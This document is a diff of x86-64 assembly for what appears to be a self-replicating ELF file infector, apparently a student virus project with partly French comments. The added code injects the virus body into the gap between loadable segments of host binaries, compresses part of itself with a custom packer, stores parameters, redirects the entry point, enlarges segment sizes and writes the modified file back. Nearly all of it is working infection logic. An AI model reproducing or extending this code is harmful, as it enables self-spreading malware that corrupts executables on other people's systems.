@@ -25,6 +25,7 @@ _start:
 newline db `\n`, 0x0
 
 _print:; (string rdi)
+	push r11
 	push rdx
 	push rsi
 
@@ -50,6 +51,7 @@ _print:; (string rdi)
 
 	pop rsi
 	pop rdx
+	pop r11
 ret
 
 %endif; ========================================================================
@@ -177,7 +179,7 @@ _unpack:; (void *rdi, void *rsi, size_t rdx)
 		xor rax, rax
 		cmp rcx, r11
 		jge .end_loop
-		cmp byte[r10 + rcx], 17
+		cmp byte[r10 + rcx], 242
 		je .uncompress_char
 			mov al, [r10 + rcx]
 			mov [r9 + r8], al
@@ -529,25 +531,76 @@ _infect_file: ; (string rdi, stat rsi)
 
 			; check size needed
 			sub rdi, r13
+			mov rdi, [rbx + 8]
 			add rdi, rsi; p_offset + p_filesz
 			mov rsi, [rbx + 56 + 8] ; next->p_offset
 			sub rsi, rdi
+
+			xor r9, r9
+			cmp r9, [rel entry_inject]
+			jne .infected
+
+			; host
 			lea rdx, [rel _eof]
 			lea r9, [rel _start]
 			sub rdx, r9
 			cmp rsi, rdx
 			jl .unmap ; if size between PT_LOAD isn't enough -> abort
-			; TODO: maybe infect via PT_NOTE ?
+			; ==		copy start of the virus
+			add rdi, r13 ; addr pointer -> mmap
+			mov rax, rdi
+			push rax; save
 
+			lea rsi, [rel _start]
+			lea rdx, [rel _packed_part]
+			sub rdx, r9
+			call _ft_memcpy
+
+			; ==		pack a part
+			add rdi, rdx
+			call _pack
+			push rax
+			pop r9
+
+			; ==		copy end
+			lea rsi, [rel _end_of_pack]
+			add rdi, r9
+			lea rdx, [rel _eof]
+			sub rdx, rsi
+			sub rdx, 8 * 4; params
+			call _ft_memcpy
+
+			; ==		change rdx, rax, rdi
+			push rcx; save
+			mov rcx, rdx
+			push rdi
+			add rdx, r9
+			lea rax, [rel _packed_part]
+			lea r9, [rel _start]
+			sub rax, r9
+			add rdx, rax
+			pop rax
+			add rax, rcx; end
+			pop rcx; recover
+			pop rdi; mmap
+
+			jmp .params
+
+			.infected:
+			; TODO: CA NE MARCHERA JAAAMMAAAIIISS
+			mov rdx, [rel length]
 			; copy virus
 			sub rdx, 8 * 4
 			add rdi, r13 ; addr pointer -> mmap
 			mov rsi, r8
 			call _ft_memcpy
-
-			; add _params
 			add rax, rdx ; go to the end
+
+			.params:
+			; add _params
+			add rdx, 8 * 4
 			mov [rax], rdx ; length
+
 			add rax, 8
 			mov rsi, [rbx + 16]
 			mov [rax], rsi ; vaddr
@@ -569,17 +622,18 @@ _infect_file: ; (string rdi, stat rsi)
 			mov [r13 + 24], rdi ; new_entry
 
 			; change pt_load size
-			add rdx, 8 * 4
 			add [rbx + 32], rdx; p_filesz + virus
 			add [rbx + 40], rdx; p_memsz + virus
 
 			; write everything in file
 			mov rdi, r11
+			push r11
 			mov rsi, r13
 			mov rdx, [r12 + 48]
 			push 1
 			pop rax
 			syscall
+			pop r11
 	.unmap:
 		push r11; munmap using r11 ?
 		push r13
@@ -760,6 +814,8 @@ _ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
 	xor rax,rax
 	xor r8, r8
 	sub rsi, rcx
+	cmp rsi, 0x0
+	jl .return
 	cmp rcx, 0x0
 	je .return
 	.loop_byte:
@@ -898,113 +954,98 @@ _end_host:
 ;               v dest
 _pack: ;(void *rdi) -> ret size + fill rdi
 	push r8
-	push r9
 	push r10
 	push r11
+	push r12
 	push rbx
 	push rcx
 	push rdx
+	push rsi
 
-	mov rax, rdi
-	push rax
-	lea rsi, [rel _packed_part]; addr
-	mov r8, rsi; buffer
-	mov r9, rsi; dictionary
 	lea rdx, [rel _end_of_pack]
-	sub rdx, rsi; size
-	xor rcx, rcx; i
-	.loop_char:
-		mov rbx, r9
-		sub rbx, r8; len = dictionary - buffer
-		cmp rbx, 255
+	lea r10, [rel _packed_part] ; dictionary = addr
+	mov r11, r10; buffer = addr
+	sub rdx, r10; size
+
+	xor rcx, rcx; i = 0
+	xor r8, r8; l = 0
+	.loop_compress:
+		cmp rcx, rdx; while (i < size) {
+		jge .end_compress
+		mov rsi, r10
+		sub rsi, r11; len = dictionary - buffer
+		cmp rsi, 255; if (len > 255) {
 		jle .continue
-		add r8, rbx
-		sub r8, 255; buffer += len - 255
-		mov rbx, r9
-		sub rbx, r8; len = dictionary - buffer
-		.continue:
-		xor r10, r10; ret
+		add r11, rsi
+		sub r11, 255; buffer += len - 255
+		mov rsi, r10
+		sub rsi, r11; len = dictionary - buffer
+		.continue: ; }
 		push 1
-		pop rsi; k
-		xor r11, r11; prev_ret
-		.loop_find_needle:
-			cmp rsi, 255
-			jge .end_loop_find_needle; if k >= 255
-			mov rax, rcx
-			add rax, rsi
-			cmp rax, rdx
-			jge .end_loop_find_needle; if i + k >= size
-
+		pop rbx; k = 1
+		xor r12, r12; prev_ret = 0
+		.loop_memmem:; while
+			cmp rbx, 255
+			jge .end_memmem; (k < 255
+			mov rax, rbx
+			add rax, rcx
+			cmp rax, rdx; && i + k < size)
+			jge .end_memmem
 			push rdi
-			push r8
-			pop rdi
-			push rcx
-			push rsi
-			pop rcx
-			push rbx
-			pop rsi
 			push rdx
-			push r9
-			pop rdx
-			call _ft_memmem ; memmem(buffer, len, dictionary, k)
-			push rdx
-			pop r9
-			pop rdx
-			push rsi
-			pop rbx
 			push rcx
-			pop rsi
+			mov rdi, r11
+			mov rdx, r10
+			mov rcx, rbx
+			call _ft_memmem; ret = ft_memmem(buffer, len, dictionary, k)
 			pop rcx
-			push rdi
-			pop r8
+			pop rdx
 			pop rdi
-
-			cmp rax, 0x0
-			je .end_loop_find_needle
-
+			cmp rax, 0x0; if (!ret) break
+			je .end_memmem
 			push rax
-			pop r11; prev_ret = ret
-			inc rsi; k++
-		jmp .loop_find_needle
-		.end_loop_find_needle:
-
-		cmp r11, 0x0
-		jne .compress_char; prev_ret
-		mov rax, rsi
-		dec rax
-		cmp rax, 4
-		jge .compress_char; if k - 1 >= 4
+			pop r12; prev_ret = ret
+			inc rbx; k++
+		jmp .loop_memmem
+		.end_memmem:; }
+		dec rbx; k--
+		cmp r12, 0x0; if (prev_ret
+		je .not_compress_char
+		cmp rbx, 4; && k >= 4) {
+		jl .not_compress_char
+		mov byte[rdi + r8], 242; addr[l] = 242
+		inc r8; l++
+		mov rax, r10
+		sub rax, r12
+		mov byte[rdi + r8], al; addr[l] = dictionary - prev_ret
+; == TODO: test
+		inc r8; l++
+		mov rax, rbx
+		mov byte[rdi + r8], al; addr[l] = k
+; == TODO: test
+		inc r8; l++
+		jmp .next_loop; }
+		.not_compress_char:; else {
 		push 1
-		pop rsi; k = 1
-		mov [rdi], r9
-		inc rdi
+		pop rbx; k = 1
+		mov al, [r10]
+		mov byte[rdi + r8], al; addr[l] = *dictionary
+		inc r8; l++
+	.next_loop:; }
+		add r10, rbx; dictionary += k
+		add rcx, rbx; i += k
+		jmp .loop_compress
+	.end_compress: ; }
+		push r8
+		pop rax
 
-		jmp .end_loop_char
-		.compress_char:
-			mov byte[rdi], 17; 17 not in the code and its 00010001 in binary ;)
-			mov rax, r9
-			sub rax, r11
-			mov byte[rdi + 1], ah; d
-			mov byte[rdi + 2], sil; l
-			add rdi, 3
-
-	.end_loop_char:
-		add r9, rsi; dictionary += k
-		add rcx, rsi; i += k
-	cmp rcx, rdx
-	jl .loop_char
-
-	mov rax, rdi
-	pop rdi; bring back addr
-	sub rax, rdi; end_dst - dst => size
-	inc rax
-
-	pop rbx
+	pop rsi
 	pop rdx
 	pop rcx
+	pop rbx
+	pop r12
 	pop r11
 	pop r10
-	pop r9
 	pop r8
 ret
 ; ==
